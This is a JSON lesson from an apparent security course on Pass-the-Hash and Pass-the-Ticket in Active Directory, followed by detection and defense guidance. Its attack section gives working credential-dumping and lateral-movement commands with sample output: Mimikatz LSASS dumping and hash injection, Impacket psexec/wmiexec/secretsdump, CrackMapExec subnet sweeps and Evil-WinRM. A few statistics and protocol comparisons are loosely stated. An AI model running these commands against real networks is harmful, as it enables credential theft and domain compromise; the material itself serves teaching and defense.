{
  "lesson_id": "ad-pth-001",
  "title": "Pass-the-Hash and Pass-the-Ticket Attacks",
  "domain": "active_directory",
  "difficulty": 3,
  "estimated_time": 70,
  "prerequisites": ["ad-enum-001", "ad-auth-001"],
  "concepts": [
    "NTLM authentication exploitation",
    "Password hash usage without cracking",
    "Kerberos ticket theft and reuse",
    "Lateral movement techniques",
    "Credential caching in LSASS",
    "Mimikatz sekurlsa module",
    "Pass-the-Hash detection",
    "Credential Guard protection"
  ],
  "learning_objectives": [
    "Understand how Pass-the-Hash attacks exploit NTLM authentication to move laterally without knowing plaintext passwords",
    "Extract and reuse password hashes and Kerberos tickets from LSASS memory",
    "Perform Pass-the-Ticket attacks to impersonate users with cached Kerberos tickets",
    "Detect Pass-the-Hash and Pass-the-Ticket attacks through Windows event log analysis",
    "Implement defensive measures including Credential Guard, LAPS, and NTLM restriction"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "title": "The Authentication Bypass Mindset",
      "content": "Imagine you're trying to enter a secure building. Traditional attacks try to guess the password on the keypad. Pass-the-Hash is different: you steal the keycard from someone who already entered, and you use their card to get in. You don't need to know the PIN—you have the card.\n\n**Jim Kwik Learning Principle: Association**\n\nConnect these attacks to concepts you already know:\n- **Pass-the-Hash** is like using someone's credit card (you don't need to know the PIN, just swipe the card)\n- **Pass-the-Ticket** is like using someone's plane boarding pass (you present it and board)\n- **Both** bypass the need for passwords by reusing authentication artifacts\n\n**Why This Matters:**\n\nPass-the-Hash is one of the **most common lateral movement techniques** in real-world breaches:\n- **Found in 90%+ of ransomware attacks**\n- **Primary method** for spreading from one compromised system to others\n- **Survived** for 20+ years despite awareness (still works today)\n\n**Your Learning Path:**\n\nThis lesson bridges credential access and lateral movement:\n1. **How** attackers extract credentials from memory\n2. **Why** password hashes work without cracking them\n3. **When** to use Pass-the-Hash vs Pass-the-Ticket\n4. **Where** these attacks show up in logs\n5. **How to stop them** with modern defenses\n\n**Mindset Shift:**\n- **From**: \"If I have admin access on this workstation, I'm stuck here\"\n- **To**: \"If I have admin access, I can extract credentials and spread laterally across the network\"\n\nThese techniques are fundamental to penetration testing, red teaming, and incident response. Master them."
    },
    {
      "type": "explanation",
      "title": "Understanding NTLM Authentication",
      "content": "Before you can understand Pass-the-Hash, you must understand NTLM authentication—the legacy protocol that makes this attack possible.\n\n## What is NTLM?\n\n**NTLM (NT LAN Manager)** is a Microsoft authentication protocol that uses password hashes for authentication.\n\n**Key Fact**: NTLM sends the **password hash** (not the plaintext password) during authentication.\n\n## NTLM Authentication Flow\n\n```\n┌────────────────────────────────────────────────────┐\n│         NORMAL NTLM AUTHENTICATION                 │\n└────────────────────────────────────────────────────┘\n\nStep 1: Client wants to access Server\n   Client → Server: \"I want to connect as 'bob'\"\n\nStep 2: Server sends Challenge\n   Server → Client: \"Prove you're bob. Here's a random challenge: a1b2c3d4e5f6g7h8\"\n\nStep 3: Client calculates Response\n   Client calculates:\n   Response = HMAC_MD5(Bob's NTLM hash, Challenge)\n   \n   Bob's password: \"Password123!\"\n   Bob's NTLM hash: 8846F7EAEE8FB117AD06BDD830B7586C\n   Challenge: a1b2c3d4e5f6g7h8\n   Response: [calculated value]\n\nStep 4: Client sends Response\n   Client → Server: \"Here's my response: [calculated value]\"\n\nStep 5: Server validates\n   Server:\n   - Looks up bob's NTLM hash from SAM/AD\n   - Calculates: HMAC_MD5(Bob's hash, Challenge)\n   - Compares with Client's response\n   - Match? → Authenticated ✅\n   - No match? → Access Denied ❌\n```\n\n## The Pass-the-Hash Vulnerability\n\n**Critical Observation**: The client only needs **Bob's NTLM hash** to authenticate. It never needs the plaintext password!\n\n**Pass-the-Hash Attack Flow:**\n\n```\n┌────────────────────────────────────────────────────┐\n│            PASS-THE-HASH ATTACK                    │\n└────────────────────────────────────────────────────┘\n\nStep 1: Attacker compromises Workstation A\n   - Gets local admin via phishing\n   - Bob logged into Workstation A earlier\n\nStep 2: Attacker dumps LSASS memory\n   mimikatz # sekurlsa::logonpasswords\n   \n   Output:\n   Username: bob\n   Domain: CORP\n   NTLM: 8846F7EAEE8FB117AD06BDD830B7586C ← STOLEN!\n\nStep 3: Attacker wants to access Workstation B\n   - Bob has admin rights on Workstation B\n   - Attacker doesn't know bob's password\n   - But attacker HAS bob's NTLM hash!\n\nStep 4: Pass-the-Hash attack\n   Attacker → Workstation B: \"I want to connect as 'bob'\"\n   Workstation B → Attacker: \"Challenge: x1y2z3w4v5u6t7s8\"\n   \n   Attacker calculates:\n   Response = HMAC_MD5(Stolen NTLM hash, Challenge)\n   \n   Attacker → Workstation B: \"Response: [calculated]\"\n   \n   Workstation B validates:\n   - Looks up bob's hash\n   - Verifies response\n   - Match! → Attacker authenticated as bob ✅\n\nStep 5: Lateral Movement achieved\n   Attacker now has admin access to Workstation B\n   Can dump more credentials, spread further\n```\n\n## Why Pass-the-Hash Works\n\n**Three key factors:**\n\n1. **NTLM hash IS the secret**\n   - Unlike other protocols (Kerberos, modern TLS), NTLM doesn't salt hashes\n   - Hash alone is sufficient for authentication\n   - No need to crack the hash to plaintext\n\n2. **Credential caching**\n   - Windows caches credentials in LSASS memory\n   - Any user who logs into a system leaves credentials behind\n   - Local admin can extract these credentials\n\n3. **Privilege reuse**\n   - Users often have admin rights on multiple systems\n   - Service accounts have admin rights on dozens/hundreds of systems\n   - One compromised system → access to many others\n\n## NTLM Hash Format\n\n**NTLM hash generation:**\n```\nPassword: \"Password123!\"\n         ↓\n   UTF-16-LE encoding\n         ↓\n   MD4 hash\n         ↓\nNTLM Hash: 8846F7EAEE8FB117AD06BDD830B7586C\n```\n\n**Important**: \n- NTLM uses **MD4** (ancient, broken hash algorithm)\n- **No salt** (same password = same hash across all systems)\n- **32 hex characters** (128 bits)\n\n**LM Hash (Legacy)**:\n```\nPassword: \"Password123!\"\n         ↓\n   Uppercase: \"PASSWORD123!\"\n         ↓\n   Split into 7-char chunks + DES encryption\n         ↓\nLM Hash: E52CAC67419A9A224A3B108F3FA6CB6D\n```\n\n**LM Hash weaknesses**:\n- Uppercases password (reduces complexity)\n- Splits into 7-character chunks (easy to crack)\n- Disabled by default since Windows Vista\n- When seen, usually: `aad3b435b51404eeaad3b435b51404ee` (empty LM)\n\n## Pass-the-Hash vs Password Cracking\n\n**Password Cracking (Traditional)**:\n```\nExtract hash → Try millions of passwords → Find plaintext → Authenticate\n   ↓              ↓                          ↓               ↓\n  Fast         SLOW (hours/days)          Maybe success    Authenticate\n```\n\n**Pass-the-Hash (Modern)**:\n```\nExtract hash → Authenticate with hash\n   ↓              ↓\n  Fast         INSTANT ✅\n```\n\n**Why attackers prefer Pass-the-Hash:**\n- ✅ **Instant** (no waiting for crack)\n- ✅ **Works with strong passwords** (don't need to crack)\n- ✅ **Stealthy** (fewer failed login attempts)\n- ✅ **Reliable** (guaranteed to work if hash is valid)\n\n## Where Credentials Are Stored\n\n**LSASS (Local Security Authority Subsystem Service)**:\n- Process: `lsass.exe`\n- Purpose: Handles authentication\n- Contents: \n  - Plaintext passwords (in some cases)\n  - NTLM hashes\n  - Kerberos tickets\n  - Kerberos encryption keys\n\n**Credential Types in LSASS:**\n\n1. **Logon Sessions**\n   - Interactive logon (user at keyboard)\n   - Remote Desktop\n   - RunAs sessions\n\n2. **Service Accounts**\n   - Services running as specific accounts\n   - Scheduled tasks\n\n3. **Cached Domain Credentials**\n   - Last 10 users (default)\n   - For offline logon\n\n**Credential Lifetime:**\n- Credentials remain in LSASS **until reboot** or **session ends**\n- Logging out removes credentials\n- But if you had **admin access** and dumped before logout, credentials are stolen\n\n## NTLM vs Kerberos\n\n```\n┌──────────────────┬────────────────────┬────────────────────┐\n│ Feature          │ NTLM               │ Kerberos           │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Age              │ 1990s (legacy)     │ 2000+ (modern)     │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Hash Algorithm   │ MD4 (weak)         │ AES/RC4 (stronger) │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Pass-the-Hash    │ ✅ Yes             │ ❌ No              │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Pass-the-Ticket  │ ❌ No              │ ✅ Yes             │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Mutual Auth      │ ❌ No              │ ✅ Yes             │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Used When        │ Workgroup, IP addr │ Domain joined      │\n│                  │ NetBIOS name       │ FQDN               │\n├──────────────────┼────────────────────┼────────────────────┤\n│ Can Be Disabled? │ Yes (with caution) │ No (domain core)   │\n└──────────────────┴────────────────────┴────────────────────┘\n```\n\n**When NTLM is used (even in Kerberos environments):**\n- Accessing server by IP address: `\\\\192.168.1.100\\share`\n- NetBIOS name: `\\\\SERVER\\share` (if DNS fails)\n- Workgroup computers\n- Legacy applications that don't support Kerberos\n- Authentication across forests without trust\n\n## Common Misconception\n\n**Myth**: \"We use Kerberos, so we're safe from Pass-the-Hash.\"\n\n**Reality**: \n- NTLM is still widely used as **fallback**\n- Many admin tools use NTLM by default\n- Pass-the-Hash works whenever NTLM is used\n- Unless explicitly blocked, NTLM remains active\n\n**Example scenario:**\n```powershell\n# Kerberos (requires FQDN)\nEnter-PSSession -ComputerName DC01.corp.local -Credential $cred  # Uses Kerberos\n\n# NTLM (IP address)\nEnter-PSSession -ComputerName 192.168.1.10 -Credential $cred  # Uses NTLM (Pass-the-Hash works!)\n```\n\nIn the next section, you'll learn the exact techniques to extract and use NTLM hashes for lateral movement."
    },
    {
      "type": "code_exercise",
      "title": "Pass-the-Hash Attack Techniques",
      "content": "Now you'll learn the practical methods to extract NTLM hashes and perform Pass-the-Hash attacks.\n\n## Extracting NTLM Hashes from LSASS\n\n### Method 1: Mimikatz (Most Common)\n\n**Prerequisites**: Local Administrator privileges on target system\n\n```cmd\n# Run Mimikatz (requires admin)\nmimikatz.exe\n\n# Enable SeDebugPrivilege (required to access LSASS)\nmimikatz # privilege::debug\nPrivilege '20' OK\n\n# Dump logon passwords from LSASS\nmimikatz # sekurlsa::logonpasswords\n\nAuthentication Id : 0 ; 442845 (00000000:0006c27d)\nSession           : Interactive from 1\nUser Name         : bob\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 1/15/2024 9:30:22 AM\nSID               : S-1-5-21-1234567890-1234567890-1234567890-1105\n        msv :\n         [00000003] Primary\n         * Username : bob\n         * Domain   : CORP\n         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c  ← TARGET!\n         * SHA1     : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n        tspkg :\n        wdigest :\n         * Username : bob\n         * Domain   : CORP\n         * Password : (null)  ← Plaintext disabled by default Windows 8.1+\n        kerberos :\n         * Username : bob\n         * Domain   : CORP.LOCAL\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 385421 (00000000:0005e18d)\nSession           : Interactive from 1\nUser Name         : alice\nDomain            : CORP\nLogon Server      : DC01\nLogon Time        : 1/15/2024 8:15:10 AM\nSID               : S-1-5-21-1234567890-1234567890-1234567890-1110\n        msv :\n         [00000003] Primary\n         * Username : alice\n         * Domain   : CORP\n         * NTLM     : 64f12cddaa88057e06a81b54e73b949b  ← Another one!\n         * SHA1     : b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0\n        [...]\n```\n\n**What you extract:**\n- Username: `bob`\n- Domain: `CORP`\n- NTLM Hash: `8846f7eaee8fb117ad06bdd830b7586c`\n\n### Method 2: Dump LSASS with Task Manager (Stealthier)\n\n```\n1. Open Task Manager (Ctrl+Shift+Esc)\n2. Details tab\n3. Find \"lsass.exe\"\n4. Right-click → Create dump file\n5. Copy dump file to attacker machine\n6. Parse with Mimikatz offline\n```\n\n**Offline parsing:**\n```cmd\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n```\n\n**Advantage**: No Mimikatz on victim system (avoids AV/EDR detection)\n\n### Method 3: Procdump (Microsoft-Signed Tool)\n\n```cmd\n# Download Sysinternals procdump.exe (signed by Microsoft)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Transfer to attacker machine\n# Parse with Mimikatz\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n```\n\n**Advantage**: Microsoft-signed binary (less likely to be blocked)\n\n### Method 4: Impacket secretsdump (Remote)\n\n```bash\n# From Linux attacker machine\nsecretsdump.py CORP/admin:Password123!@192.168.1.100\n\n# Output:\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nbob:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\n[...]\n```\n\n## Performing Pass-the-Hash Attacks\n\n### Method 1: Mimikatz Pass-the-Hash\n\n```cmd\n# Launch Mimikatz\nmimikatz.exe\n\n# Pass-the-Hash to spawn command prompt as bob\nmimikatz # sekurlsa::pth /user:bob /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe\n\n# A new command prompt opens\n# This new cmd.exe has bob's credentials loaded\n\n# Test access\ndir \\\\WorkstationB\\C$\n# SUCCESS! (if bob has admin on WorkstationB)\n\npsexec \\\\WorkstationB cmd\n# Remote shell as bob\n```\n\n**What happened:**\n1. Mimikatz injected bob's NTLM hash into memory\n2. New process (cmd.exe) has bob's credentials\n3. Any network authentication from this process uses bob's hash\n4. NTLM authentication succeeds (Pass-the-Hash)\n\n### Method 2: Impacket psexec (Linux)\n\n```bash\n# Format: username:LMhash:NTLMhash\n# LMhash usually: aad3b435b51404eeaad3b435b51404ee (empty)\n\npsexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c CORP/bob@192.168.1.101\n\n# Get shell on 192.168.1.101 as bob\nMicrosoft Windows [Version 10.0.19045.3803]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nWORKSTATIONB\n```\n\n**Why SYSTEM?** psexec.py installs a service that runs as SYSTEM, then spawns your shell.\n\n### Method 3: Impacket wmiexec (Stealthier)\n\n```bash\n# WMI execution (no service installation, less noisy)\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c CORP/bob@192.168.1.101\n\n# Semi-interactive shell\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\> whoami\ncorp\\bob\n\nC:\\> hostname\nWORKSTATIONB\n```\n\n### Method 4: CrackMapExec (Mass Lateral Movement)\n\n```bash\n# Test hash against multiple targets\ncrackmapexec smb 192.168.1.0/24 -u bob -H 8846f7eaee8fb117ad06bdd830b7586c -d CORP\n\n# Output:\nSMB    192.168.1.100    445    WORKSTATIONA    [+] CORP\\bob:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)\nSMB    192.168.1.101    445    WORKSTATIONB    [+] CORP\\bob:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)\nSMB    192.168.1.102    445    WORKSTATIONC    [-] CORP\\bob:8846f7eaee8fb117ad06bdd830b7586c STATUS_LOGON_FAILURE\nSMB    192.168.1.103    445    WORKSTATIOND    [+] CORP\\bob:8846f7eaee8fb117ad06bdd830b7586c\n\n# \"Pwn3d!\" = admin access\n# \"+\" = valid creds but not admin\n# \"-\" = failed\n\n# Execute command on all Pwn3d systems\ncrackmapexec smb 192.168.1.0/24 -u bob -H 8846f7eaee8fb117ad06bdd830b7586c -d CORP -x \"whoami\"\n```\n\n### Method 5: Evil-WinRM (Remote PowerShell)\n\n```bash\n# Pass-the-Hash with Evil-WinRM\nevil-winrm -i 192.168.1.101 -u bob -H 8846f7eaee8fb117ad06bdd830b7586c\n\n# PowerShell remote session\nEvil-WinRM shell v3.4\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\ncorp\\bob\n\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> Get-Process\n# Full PowerShell capabilities\n```\n\n## Pass-the-Ticket (Kerberos Variant)\n\n**Difference**: Pass-the-Hash uses NTLM, Pass-the-Ticket uses Kerberos tickets.\n\n### Extracting Kerberos Tickets\n\n```cmd\n# Mimikatz - export all Kerberos tickets\nmimikatz # sekurlsa::tickets /export\n\n# Output:\n[00000000] - 0x00000012 - aes256_hmac\n   Start/End/MaxRenew: 1/15/2024 9:30:22 AM ; 1/15/2024 7:30:22 PM ; 1/22/2024 9:30:22 AM\n   Server Name       : krbtgt/CORP.LOCAL @ CORP.LOCAL\n   Client Name       : bob @ CORP.LOCAL\n   Flags 40e00000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;\n    * Saved to file : [0;6c27d]-0-0-40e00000-bob@krbtgt-CORP.LOCAL.kirbi\n\n[00000001] - 0x00000012 - aes256_hmac\n   Start/End/MaxRenew: 1/15/2024 10:15:30 AM ; 1/15/2024 7:30:22 PM ; 1/22/2024 9:30:22 AM\n   Server Name       : cifs/fileserver.corp.local @ CORP.LOCAL\n   Client Name       : bob @ CORP.LOCAL\n   Flags 40a00000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;\n    * Saved to file : [0;6c27d]-0-1-40a00000-bob@cifs-fileserver.corp.local.kirbi\n\n[...]\n```\n\n### Injecting Stolen Tickets\n\n```cmd\n# Inject TGT into current session\nmimikatz # kerberos::ptt [0;6c27d]-0-0-40e00000-bob@krbtgt-CORP.LOCAL.kirbi\n\n# Verify\nklist\n\nCurrent LogonId is 0:0x1a2b3c\n\nCached Tickets: (1)\n\n#0>     Client: bob @ CORP.LOCAL\n        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 1/15/2024 9:30:22 (local)\n        End Time:   1/15/2024 19:30:22 (local)\n        Renew Time: 1/22/2024 9:30:22 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n\n# Now use bob's ticket\ndir \\\\fileserver.corp.local\\share\n# Uses bob's Kerberos ticket (Pass-the-Ticket)\n```\n\n### Impacket Pass-the-Ticket\n\n```bash\n# Export ticket from Windows\nmimikatz # kerberos::list /export\n\n# Convert .kirbi to .ccache (Linux format)\nticketConverter.py bob@krbtgt-CORP.LOCAL.kirbi bob.ccache\n\n# Set environment variable\nexport KRB5CCNAME=bob.ccache\n\n# Use ticket\npsexec.py -k -no-pass CORP/bob@fileserver.corp.local\n# -k = use Kerberos\n# -no-pass = use cached ticket (no password)\n```\n\n## Pass-the-Hash Attack Scenarios\n\n### Scenario 1: Horizontal Privilege Escalation\n\n```\nAttacker compromises Workstation A (local admin)\n         ↓\nDumps LSASS: finds bob (domain user)\n         ↓\nPass-the-Hash to Workstation B (bob has local admin)\n         ↓\nDumps LSASS on Workstation B: finds alice (domain admin!)\n         ↓\nPass-the-Hash with alice's hash to Domain Controller\n         ↓\nDomain Compromised\n```\n\n### Scenario 2: Service Account Jackpot\n\n```\nCompromise any server running SQL Service\n         ↓\nDump LSASS: find svc_mssql (service account)\n         ↓\nsvc_mssql has admin rights on 50 servers\n         ↓\nPass-the-Hash to all 50 servers\n         ↓\nMass lateral movement\n```\n\n### Scenario 3: Domain Admin Hunting\n\n```bash\n# CrackMapExec: find where Domain Admins are logged in\ncrackmapexec smb 192.168.1.0/24 -u bob -H 8846... --sessions\n\n# Output shows:\n# 192.168.1.105: CORP\\Administrator session active\n\n# Target that system\npsexec.py -hashes aad3b...:8846... CORP/bob@192.168.1.105\n\n# Dump LSASS\nmimikatz # sekurlsa::logonpasswords\n# Found: Administrator NTLM hash!\n\n# Pass-the-Hash to DC\npsexec.py -hashes aad3b...:ADMIN_HASH CORP/Administrator@192.168.1.10\n# Domain Controller compromised\n```\n\n## Why Pass-the-Hash is So Effective\n\n**Factors contributing to success:**\n\n1. **Credential Reuse**\n   - Same local admin password on multiple workstations\n   - Same service account across many servers\n   - Domain admins logging into regular workstations\n\n2. **NTLM Still Active**\n   - Legacy protocol but still enabled by default\n   - Fallback when Kerberos isn't available\n   - Many tools default to NTLM\n\n3. **Hash Never Changes**\n   - Unlike Kerberos tickets (expire after hours)\n   - NTLM hash valid until password changes\n   - Service account passwords rarely change\n\n4. **Detection Difficulty**\n   - Pass-the-Hash looks like normal authentication\n   - No failed login attempts (hash is valid)\n   - Logs show \"user bob logged in\" (true, but it's the attacker)\n\nIn the next section, you'll learn how to detect these attacks."
    },
    {
      "type": "explanation",
      "title": "Detection and Defense",
      "content": "Pass-the-Hash is challenging to detect because it uses legitimate credentials. However, there are telltale indicators.\n\n## Detection Methods\n\n### Method 1: Unusual Logon Patterns\n\n**Event ID 4624 - An account was successfully logged on**\n\n**Key fields for Pass-the-Hash detection:**\n- Logon Type: **3** (Network logon) or **9** (NewCredentials)\n- Authentication Package: **NTLM**\n- Workstation Name: Different from user's normal workstation\n- Source IP: Different from user's normal IP\n\n**Detection Logic:**\n```spl\n# Splunk: Detect NTLM logons from unusual sources\nindex=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM\n| where User!=\"*$\"  # Exclude computer accounts\n| stats dc(Source_Network_Address) as unique_ips by User\n| where unique_ips > 5  # User logging in from 5+ different IPs\n```\n\n**Indicator**: User logging in from multiple systems in short time (impossible travel)\n\n### Method 2: NTLM Authentication Patterns\n\n**Event ID 4624 Analysis:**\n\n**Normal Kerberos logon:**\n```xml\nEvent ID: 4624\nLogon Type: 3\nAuthentication Package: Kerberos\nWorkstation Name: WORKSTATIONA\nSource IP: 192.168.1.100\n```\n\n**Pass-the-Hash (NTLM):**\n```xml\nEvent ID: 4624\nLogon Type: 3\nAuthentication Package: NTLM  ← Red flag (why not Kerberos?)\nWorkstation Name: KALI-LINUX   ← Non-Windows name (suspicious)\nSource IP: 192.168.1.200       ← Unusual source\n```\n\n**Detection**: Sudden spike in NTLM authentication when Kerberos should be used\n\n### Method 3: Logon Type 9 Detection\n\n**Logon Type 9**: NewCredentials (used by mimikatz sekurlsa::pth)\n\n```spl\nindex=windows EventCode=4624 Logon_Type=9\n| stats count by User, Source_Network_Address, Workstation_Name\n| where count > 1\n```\n\n**Why this matters**: Logon Type 9 is rare in normal operations, common in Pass-the-Hash\n\n### Method 4: NTLM Audit Logs (Enhanced)\n\n**Enable NTLM auditing via Group Policy:**\n```\nComputer Configuration → Windows Settings → Security Settings → Local Policies → Security Options\n\n\"Network security: Restrict NTLM: Audit NTLM authentication in this domain\"\nSet to: Enable all\n\n\"Network security: Restrict NTLM: Audit Incoming NTLM Traffic\"\nSet to: Enable auditing for all accounts\n```\n\n**Events generated:**\n- **Event ID 8004**: NTLM authentication rejected\n- **Event ID 8005**: NTLM authentication accepted\n\n**Query for unusual NTLM usage:**\n```powershell\nGet-WinEvent -FilterHashtable @{LogName='System';ID=8005} | \n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    [PSCustomObject]@{\n      Time = $_.TimeCreated\n      User = $xml.Event.EventData.Data[0].'#text'\n      Domain = $xml.Event.EventData.Data[1].'#text'\n      Workstation = $xml.Event.EventData.Data[2].'#text'\n    }\n  } | Group-Object User | Where-Object {$_.Count -gt 10}\n```\n\n### Method 5: Honey Credentials\n\n**Concept**: Create fake local admin accounts on workstations. Any authentication with these accounts = confirmed attack.\n\n```powershell\n# On each workstation\nnet user \"admin_backup\" \"RandomPassword123!\" /add\nnet localgroup Administrators \"admin_backup\" /add\n\n# Never use this account for legitimate purposes\n\n# Alert on ANY usage\nGet-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | \n  Where-Object {$_.Properties[5].Value -eq \"admin_backup\"} | \n  ForEach-Object {\n    Send-Alert \"ATTACK DETECTED: Honey credential used!\"\n  }\n```\n\n### Method 6: Behavioral Analytics\n\n**Monitor for anomalies:**\n\n✅ User accessing systems they never access\n✅ User logging in from unusual locations\n✅ Multiple logons within seconds (user can't type that fast)\n✅ Logons from non-Windows hostnames (KALI-LINUX, PARROT-SEC)\n✅ Logons during off-hours (user normally works 9-5, now logging in at 3 AM)\n\n**UEBA Solutions:**\n- Microsoft Sentinel (Azure)\n- Splunk User Behavior Analytics\n- Exabeam\n- Rapid7 InsightIDR\n\n### Method 7: EDR Detection\n\n**Endpoint Detection and Response (EDR) tools** detect:\n\n✅ **LSASS memory access** (Mimikatz, procdump)\n✅ **Credential dumping tools** (Mimikatz signatures)\n✅ **Abnormal process behavior** (cmd.exe spawned by mimikatz with injected credentials)\n✅ **Lateral movement patterns** (rapid system-to-system access)\n\n**EDR Examples:**\n- Microsoft Defender for Endpoint\n- CrowdStrike Falcon\n- SentinelOne\n- Carbon Black\n\n**Detection**: Mimikatz execution → Alert \"Credential Access - T1003\"\n\n## Prevention and Mitigation\n\n### 1. Windows Defender Credential Guard (Primary Defense)\n\n**What it does**:\n- Uses Virtualization-Based Security (VBS)\n- Isolates LSASS in a secure container\n- Prevents credential dumping with Mimikatz\n- Blocks Pass-the-Hash attacks\n\n**Enable Credential Guard:**\n```powershell\n# Check if supported\nGet-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning\n\n# Enable via Group Policy\n# Computer Configuration → Administrative Templates → System → Device Guard\n# \"Turn On Virtualization Based Security\" = Enabled\n# \"Credential Guard Configuration\" = Enabled with UEFI lock\n\n# Or via Registry\nReg Add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"LsaCfgFlags\" /t REG_DWORD /d 1 /f\n\n# Reboot required\n```\n\n**Requirements:**\n- Windows 10 Enterprise / Windows 11 / Server 2016+\n- UEFI firmware\n- Virtualization extensions (Intel VT-x or AMD-V)\n- TPM 1.2 or 2.0\n\n**Impact**:\n- ✅ Blocks Mimikatz sekurlsa::logonpasswords\n- ✅ Prevents Pass-the-Hash\n- ✅ Still allows legitimate authentication\n- ❌ Some older applications may have compatibility issues\n\n### 2. LAPS (Local Administrator Password Solution)\n\n**Problem**: Same local admin password on all workstations → one compromise = all compromised\n\n**Solution**: LAPS\n\n**What LAPS does**:\n- Randomizes local Administrator password on each computer\n- Stores passwords in Active Directory (encrypted)\n- Rotates passwords automatically (default 30 days)\n- Only Domain Admins can retrieve passwords\n\n**Result**: Compromising Workstation A doesn't give access to Workstation B (different passwords)\n\n**Implementation:**\n```powershell\n# Install LAPS\nInstall-WindowsFeature -Name RSAT-AD-PowerShell\nImport-Module AdmPwd.PS\n\n# Extend AD schema\nUpdate-AdmPwdADSchema\n\n# Grant computers permission to update their passwords\nSet-AdmPwdComputerSelfPermission -OrgUnit \"OU=Workstations,DC=corp,DC=local\"\n\n# Deploy LAPS GPO\n# Computer Configuration → Policies → Administrative Templates → LAPS\n# Enable local admin password management\n# Set password complexity, length (14+ chars), age (30 days)\n```\n\n**Testing:**\n```powershell\n# Retrieve password for workstation (requires admin rights)\nGet-AdmPwdPassword -ComputerName WORKSTATIONA | Select-Object Password, ExpirationTimestamp\n```\n\n### 3. Disable NTLM (If Possible)\n\n**Most effective defense**: No NTLM = No Pass-the-Hash\n\n**Group Policy:**\n```\nComputer Configuration → Windows Settings → Security Settings → Local Policies → Security Options\n\n\"Network security: Restrict NTLM: NTLM authentication in this domain\"\nSet to: Deny all\n\n\"Network security: Restrict NTLM: Incoming NTLM traffic\"\nSet to: Deny all accounts\n\n\"Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers\"\nSet to: Deny all\n```\n\n**Warning**: Test thoroughly! Disabling NTLM can break:\n- Legacy applications\n- Third-party software\n- Connections to workgroup systems\n- Some VPN clients\n\n**Phased approach:**\n1. **Audit** NTLM usage (log only, don't block)\n2. **Analyze** logs for legitimate NTLM usage\n3. **Migrate** applications to Kerberos\n4. **Block** NTLM after migration complete\n\n### 4. Protected Users Security Group\n\n**Protections for members:**\n- ❌ Cannot authenticate with NTLM\n- ❌ Cannot use DES or RC4 in Kerberos pre-auth\n- ❌ Credentials not cached on systems\n- ✅ TGT lifetime limited to 4 hours (not 10)\n\n**Add high-value accounts:**\n```powershell\nAdd-ADGroupMember -Identity \"Protected Users\" -Members Administrator,Domain_Admin_Bob,Domain_Admin_Alice\n```\n\n**Trade-off**: May break legacy apps or services\n\n### 5. Restrict Administrative Privileges\n\n**Principle**: Fewer admin accounts = smaller attack surface\n\n```powershell\n# Audit who has local admin rights\n# Use BloodHound or PowerView\n\n# Remove unnecessary local admins\nnet localgroup Administrators bob /delete\n\n# Use Just-In-Time (JIT) admin access\n# Microsoft Identity Manager or PAM solutions\n```\n\n### 6. Network Segmentation\n\n**Goal**: Limit lateral movement even if Pass-the-Hash succeeds\n\n**Implementation:**\n- VLANs for different departments\n- Firewalls between segments\n- Restrict SMB/RPC between workstations\n\n**Example firewall rule:**\n```\nBlock: TCP 445 (SMB) from Workstation VLAN to Workstation VLAN\nAllow: TCP 445 from Workstation VLAN to Server VLAN\nAllow: TCP 445 from Admin VLAN to all\n```\n\n**Result**: Even with valid credentials, attackers can't move workstation-to-workstation\n\n### 7. Monitor LSASS Access\n\n**Sysmon Rule (Detect LSASS dumping):**\n```xml\n<RuleGroup name=\"\" groupRelation=\"or\">\n  <ProcessAccess onmatch=\"include\">\n    <TargetImage condition=\"is\">C:\\Windows\\system32\\lsass.exe</TargetImage>\n  </ProcessAccess>\n</RuleGroup>\n```\n\n**Detection**: Any process accessing LSASS → Alert\n\n**Exceptions**: Legitimate security tools (whitelist)\n\n### 8. Disable WDigest (Prevent Plaintext Password Caching)\n\n**WDigest** is an old protocol that cached 